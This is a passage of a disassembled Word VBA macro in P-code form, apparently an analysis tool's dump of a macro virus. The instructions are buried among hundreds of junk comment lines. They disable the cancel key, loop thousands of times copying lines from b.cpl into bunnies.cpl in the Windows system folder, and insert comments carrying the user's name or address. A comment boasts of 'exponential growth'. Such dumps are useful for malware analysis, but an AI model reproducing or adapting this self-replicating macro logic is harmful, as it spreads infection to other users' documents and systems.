' 	QuoteRem 0x0001 0x0007 "8726489"
' Line #461:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #462:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #463:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #464:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #465:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #466:
' 	QuoteRem 0x0001 0x0007 "3789988"
' Line #467:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #468:
' 	QuoteRem 0x0001 0x0007 "3146836"
' Line #469:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #470:
' 	QuoteRem 0x0001 0x0007 "5805581"
' Line #471:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #472:
' 	QuoteRem 0x0001 0x0007 "9734286"
' Line #473:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #474:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #475:
' 	QuoteRem 0x0001 0x0007 "5673587"
' Line #476:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #477:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #478:
' 	QuoteRem 0x0001 0x0007 "3273832"
' Line #479:
' 	OnError (Resume Next) 
' Line #480:
' 	QuoteRem 0x0001 0x0000 ""
' Line #481:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #482:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #483:
' 	QuoteRem 0x0001 0x0007 "9475296"
' Line #484:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #485:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #486:
' 	QuoteRem 0x0001 0x0007 "4801870"
' Line #487:
' 	QuoteRem 0x0001 0x0000 ""
' Line #488:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #489:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #490:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #491:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #492:
' 	QuoteRem 0x0001 0x0000 ""
' Line #493:
' 	QuoteRem 0x0001 0x0006 "522532"
' Line #494:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #495:
' 	QuoteRem 0x0001 0x0000 ""
' Line #496:
' 	QuoteRem 0x0001 0x0000 ""
' Line #497:
' 	QuoteRem 0x0001 0x0000 ""
' Line #498:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #499:
' 	QuoteRem 0x0001 0x0007 "2392120"
' Line #500:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #501:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #502:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #503:
' 	QuoteRem 0x0001 0x0000 ""
' Line #504:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #505:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #506:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #507:
' 	QuoteRem 0x0001 0x0000 ""
' Line #508:
' 	QuoteRem 0x0001 0x0007 "5834182"
' Line #509:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #510:
' 	QuoteRem 0x0001 0x0000 ""
' Line #511:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #512:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #513:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #514:
' 	QuoteRem 0x0001 0x0000 ""
' Line #515:
' 	QuoteRem 0x0001 0x0000 ""
' Line #516:
' 	QuoteRem 0x0001 0x0000 ""
' Line #517:
' 	QuoteRem 0x0001 0x0007 "1788406"
' Line #518:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #519:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #520:
' 	QuoteRem 0x0001 0x0000 ""
' Line #521:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #522:
' 	QuoteRem 0x0001 0x0000 ""
' Line #523:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #524:
' 	QuoteRem 0x0001 0x0000 ""
' Line #525:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #526:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #527:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #528:
' 	QuoteRem 0x0001 0x0000 ""
' Line #529:
' 	QuoteRem 0x0001 0x0007 "2693722"
' Line #530:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #531:
' 	QuoteRem 0x0001 0x0000 ""
' Line #532:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #533:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #534:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #535:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #536:
' 	QuoteRem 0x0001 0x0000 ""
' Line #537:
' 	QuoteRem 0x0001 0x0007 "3959596"
' Line #538:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #539:
' 	QuoteRem 0x0001 0x0000 ""
' Line #540:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #541:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #542:
' 	QuoteRem 0x0001 0x0000 ""
' Line #543:
' 	QuoteRem 0x0000 0x003C " Begin to do what bunnies do...Now with exponential growth!!"
' Line #544:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #545:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #546:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #547:
' 	QuoteRem 0x0001 0x0007 "2134042"
' Line #548:
' 	QuoteRem 0x0001 0x0000 ""
' Line #549:
' 	QuoteRem 0x0001 0x0007 "9023094"
' Line #550:
' 	QuoteRem 0x0001 0x0000 ""
' Line #551:
' 	QuoteRem 0x0001 0x0007 "7349121"
' Line #552:
' 	QuoteRem 0x0001 0x0007 "2036559"
' Line #553:
' 	QuoteRem 0x0001 0x0007 "4475752"
' Line #554:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #555:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #556:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #557:
' 	QuoteRem 0x0001 0x0000 ""
' Line #558:
' 	QuoteRem 0x0001 0x0007 "3326615"
' Line #559:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #560:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #561:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #562:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #563:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #564:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #565:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #566:
' 	QuoteRem 0x0001 0x0000 ""
' Line #567:
' 	QuoteRem 0x0001 0x0000 ""
' Line #568:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #569:
' 	QuoteRem 0x0001 0x0000 ""
' Line #570:
' 	QuoteRem 0x0001 0x0000 ""
' Line #571:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #572:
' 	QuoteRem 0x0001 0x0000 ""
' Line #573:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #574:
' 	QuoteRem 0x0001 0x0007 "5346294"
' Line #575:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x0001 
' 	ForStep 
' Line #576:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #577:
' 	QuoteRem 0x0001 0x0000 ""
' Line #578:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #579:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #580:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #581:
' 	QuoteRem 0x0001 0x0007 "4602748"
' Line #582:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #583:
' 	QuoteRem 0x0001 0x0007 "2519186"
' Line #584:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #585:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #586:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #587:
' 	QuoteRem 0x0001 0x0000 ""
' Line #588:
' 	QuoteRem 0x0001 0x0007 "6997243"
' Line #589:
' 	QuoteRem 0x0001 0x0007 "7757220"
' Line #590:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #591:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #592:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #593:
' 	QuoteRem 0x0001 0x0000 ""
' Line #594:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #595:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #596:
' 	QuoteRem 0x0001 0x0006 "794867"
' Line #597:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #598:
' 	QuoteRem 0x0001 0x0007 "1675667"
' Line #599:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #600:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #601:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #602:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #603:
' 	QuoteRem 0x0001 0x0000 ""
' Line #604:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #605:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #606:
' 	QuoteRem 0x0001 0x0007 "1933745"
' Line #607:
' 	LitStr 0x0017 "C:\windows\system\b.cpl"
' 	LitDI2 0x0003 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #608:
' 	QuoteRem 0x0001 0x0007 "5989446"
' Line #609:
' 	QuoteRem 0x0001 0x0000 ""
' Line #610:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #611:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #612:
' 	QuoteRem 0x0001 0x0007 "3097139"
' Line #613:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #614:
' 	QuoteRem 0x0001 0x0007 "5501892"
' Line #615:
' 	QuoteRem 0x0001 0x0006 "372511"
' Line #616:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #617:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #618:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #619:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #620:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #621:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #622:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #623:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #624:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #625:
' 	QuoteRem 0x0001 0x0000 ""
' Line #626:
' 	QuoteRem 0x0001 0x0007 "5497806"
' Line #627:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #628:
' 	QuoteRem 0x0001 0x0007 "9299515"
' Line #629:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #630:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #631:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #632:
' 	QuoteRem 0x0001 0x0007 "2216338"
' Line #633:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #634:
' 	QuoteRem 0x0001 0x0000 ""
' Line #635:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #636:
' 	QuoteRem 0x0001 0x0000 ""
' Line #637:
' 	QuoteRem 0x0001 0x0000 ""
' Line #638:
' 	QuoteRem 0x0001 0x0007 "5755884"
' Line #639:
' 	LitStr 0x001D "C:\Windows\system\bunnies.cpl"
' 	LitDI2 0x0004 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #640:
' 	QuoteRem 0x0001 0x0000 ""
' Line #641:
' 	QuoteRem 0x0001 0x0007 "1604208"
' Line #642:
' 	QuoteRem 0x0001 0x0007 "1958260"
' Line #643:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #644:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #645:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #646:
' 	QuoteRem 0x0001 0x0007 "4494095"
' Line #647:
' 	QuoteRem 0x0001 0x0007 "3035342"
' Line #648:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #649:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #650:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #651:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #652:
' 	QuoteRem 0x0001 0x0007 "6509688"
' Line #653:
' 	QuoteRem 0x0001 0x0007 "7937665"
' Line #654:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #655:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #656:
' 	QuoteRem 0x0001 0x0007 "2839061"
' Line #657:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #658:
' 	QuoteRem 0x0001 0x0007 "5370810"
' Line #659:
' 	QuoteRem 0x0001 0x0007 "3764561"
' Line #660:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #661:
' 	QuoteRem 0x0001 0x0006 "600497"
' Line #662:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #663:
' 	QuoteRem 0x0001 0x0000 ""
' Line #664:
' 	QuoteRem 0x0001 0x0007 "3228221"
' Line #665:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #666:
' 	QuoteRem 0x0001 0x0007 "4490009"
' Line #667:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #668:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #669:
' 	QuoteRem 0x0001 0x0000 ""
' Line #670:
' 	QuoteRem 0x0001 0x0007 "1753632"
' Line #671:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #672:
' 	QuoteRem 0x0001 0x0007 "4412377"
' Line #673:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #674:
' 	QuoteRem 0x0001 0x0007 "8341082"
' Line #675:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #676:
' 	QuoteRem 0x0001 0x0000 ""
' Line #677:
' 	QuoteRem 0x0001 0x0007 "9588614"
' Line #678:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #679:
' 	QuoteRem 0x0001 0x0007 "7713765"
' Line #680:
' 	QuoteRem 0x0001 0x0007 "1880628"
' Line #681:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #682:
' 	QuoteRem 0x0001 0x0000 ""
' Line #683:
' 	QuoteRem 0x0001 0x0007 "8828058"
' Line #684:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #685:
' 	QuoteRem 0x0001 0x0006 "727493"
' Line #686:
' 	QuoteRem 0x0001 0x0000 ""
' Line #687:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #688:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #689:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #690:
' 	QuoteRem 0x0001 0x0000 ""
' Line #691:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #692:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #693:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #694:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #695:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #696:
' 	QuoteRem 0x0001 0x0000 ""
' Line #697:
' 	QuoteRem 0x0001 0x0000 ""
' Line #698:
' 	QuoteRem 0x0001 0x0000 ""
' Line #699:
' 	QuoteRem 0x0001 0x0000 ""
' Line #700:
' 	QuoteRem 0x0001 0x0007 "6686048"
' Line #701:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #702:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #703:
' 	Do 
' Line #704:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #705:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #706:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #707:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #708:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #709:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #710:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #711:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #712:
' 	QuoteRem 0x0001 0x0007 "1905144"
' Line #713:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #714:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #715:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #716:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #717:
' 	QuoteRem 0x0001 0x0007 "4525116"
' Line #718:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #719:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #720:
' 	QuoteRem 0x0001 0x0000 ""
' Line #721:
' 	QuoteRem 0x0001 0x0007 "2485008"
' Line #722:
' 	QuoteRem 0x0001 0x0000 ""
' Line #723:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #724:
' 	QuoteRem 0x0001 0x0000 ""
' Line #725:
' 	QuoteRem 0x0001 0x0000 ""
' Line #726:
' 	QuoteRem 0x0001 0x0000 ""
' Line #727:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #728:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #729:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #730:
' 	QuoteRem 0x0001 0x0007 "2912940"
' Line #731:
' 	QuoteRem 0x0001 0x0007 "7869626"
' Line #732:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #733:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #734:
' 	QuoteRem 0x0001 0x0000 ""
' Line #735:
' 	LitDI2 0x0003 
' 	Ld stuff 
' 	LineInput 
' Line #736:
' 	QuoteRem 0x0001 0x0000 ""
' Line #737:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #738:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #739:
' 	QuoteRem 0x0001 0x0000 ""
' Line #740:
' 	QuoteRem 0x0001 0x0006 "127199"
' Line #741:
' 	QuoteRem 0x0001 0x0005 "80255"
' Line #742:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #743:
' 	QuoteRem 0x0001 0x0007 "3162338"
' Line #744:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #745:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #746:
' 	QuoteRem 0x0001 0x0007 "5190697"
' Line #747:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #748:
' 	QuoteRem 0x0001 0x0006 "643355"
' Line #749:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #750:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #751:
' 	QuoteRem 0x0001 0x0000 ""
' Line #752:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #753:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #754:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #755:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #756:
' 	QuoteRem 0x0001 0x0000 ""
' Line #757:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #758:
' 	QuoteRem 0x0001 0x0007 "8365598"
' Line #759:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #760:
' 	QuoteRem 0x0001 0x0006 "770351"
' Line #761:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #762:
' 	QuoteRem 0x0001 0x0000 ""
' Line #763:
' 	QuoteRem 0x0001 0x0007 "1667250"
' Line #764:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #765:
' 	QuoteRem 0x0001 0x0000 ""
' Line #766:
' 	QuoteRem 0x0001 0x0007 "1261992"
' Line #767:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld stuff 
' 	PrintItemNL 
' Line #768:
' 	QuoteRem 0x0001 0x0000 ""
' Line #769:
' 	QuoteRem 0x0001 0x0000 ""
' Line #770:
' 	QuoteRem 0x0001 0x0000 ""
' Line #771:
' 	QuoteRem 0x0001 0x0007 "2548050"
' Line #772:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #773:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #774:
' 	QuoteRem 0x0001 0x0007 "8472164"
' Line #775:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #776:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #777:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #778:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #779:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #780:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #781:
' 	QuoteRem 0x0001 0x0000 ""
' Line #782:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #783:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #784:
' 	QuoteRem 0x0001 0x0000 ""
' Line #785:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #786:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #787:
' 	QuoteRem 0x0001 0x0000 ""
' Line #788:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #789:
' 	QuoteRem 0x0001 0x0006 "702978"
' Line #790:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #791:
' 	QuoteRem 0x0001 0x0000 ""
' Line #792:
' 	QuoteRem 0x0001 0x0007 "1130910"
' Line #793:
' 	QuoteRem 0x0001 0x0000 ""
' Line #794:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #795:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #796:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #797:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #798:
' 	QuoteRem 0x0001 0x0007 "5940415"
' Line #799:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #800:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #801:
' 	QuoteRem 0x0001 0x0007 "8814380"
' Line #802:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #803:
' 	QuoteRem 0x0001 0x0007 "2806128"
' Line #804:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #805:
' 	QuoteRem 0x0001 0x0000 ""
' Line #806:
' 	QuoteRem 0x0001 0x0000 ""
' Line #807:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #808:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #809:
' 	QuoteRem 0x0001 0x0007 "3779484"
' Line #810:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #811:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #812:
' 	QuoteRem 0x0001 0x0000 ""
' Line #813:
' 	QuoteRem 0x0001 0x0000 ""
' Line #814:
' 	QuoteRem 0x0001 0x0007 "7765304"
' Line #815:
' 	QuoteRem 0x0001 0x0007 "7617791"
' Line #816:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #817:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #818:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #819:
' 	QuoteRem 0x0001 0x0000 ""
' Line #820:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #821:
' 	QuoteRem 0x0001 0x0000 ""
' Line #822:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #823:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #824:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #825:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #826:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #827:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #828:
' 	QuoteRem 0x0001 0x0007 "7892300"
' Line #829:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #830:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #831:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #832:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #833:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #834:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #835:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #836:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #837:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #838:
' 	QuoteRem 0x0001 0x0000 ""
' Line #839:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #840:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #841:
' 	QuoteRem 0x0001 0x0007 "1116653"
' Line #842:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #843:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #844:
' 	QuoteRem 0x0001 0x0000 ""
' Line #845:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #846:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #847:
' 	QuoteRem 0x0001 0x0000 ""
' Line #848:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #849:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #850:
' 	QuoteRem 0x0001 0x0000 ""
' Line #851:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #852:
' 	QuoteRem 0x0001 0x0007 "3451525"
' Line #853:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #854:
' 	QuoteRem 0x0001 0x0007 "9031178"
' Line #855:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #856:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #857:
' 	QuoteRem 0x0001 0x0000 ""
' Line #858:
' 	QuoteRem 0x0001 0x0007 "8773100"
' Line #859:
' 	QuoteRem 0x0001 0x0000 ""
' Line #860:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #861:
' 	QuoteRem 0x0001 0x0006 "108857"
' Line #862:
' 	QuoteRem 0x0001 0x0007 "5102473"
' Line #863:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserAddress 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #864:
' 	QuoteRem 0x0001 0x0007 "7634222"
' Line #865:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #866:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #867:
' 	QuoteRem 0x0001 0x0000 ""
' Line #868:
' 	QuoteRem 0x0001 0x0000 ""
' Line #869:
' 	QuoteRem 0x0001 0x0000 ""
' Line #870:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #871:
' 	QuoteRem 0x0001 0x0007 "6959961"
' Line #872:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #873:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #874:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #875:
' 	QuoteRem 0x0001 0x0000 ""
' Line #876:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #877:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #878:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #879:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #880:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #881:
' 	QuoteRem 0x0001 0x0007 "6307147"
' Line #882:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #883:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #884:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #885:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #886:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #887:
' 	QuoteRem 0x0001 0x0000 ""
' Line #888:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #889:
' 	QuoteRem 0x0001 0x0000 ""
' Line #890:
' 	QuoteRem 0x0001 0x0007 "2468244"
' Line #891:
' 	QuoteRem 0x0001 0x0007 "4694725"
' Line #892:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #893:
' 	QuoteRem 0x0001 0x0000 ""
' Line #894:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #895:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #896:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #897:
' 	QuoteRem 0x0001 0x0000 ""
' Line #898:
' 	QuoteRem 0x0001 0x0007 "6265867"
' Line #899:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #900:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #901:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #902:
' 	QuoteRem 0x0001 0x0007 "4119192"
' Line #903:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #904:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #905:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #906:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #907:
' 	QuoteRem 0x0001 0x0007 "6501271"
' Line #908:
' 	QuoteRem 0x0001 0x0007 "7404745"
' Line #909:
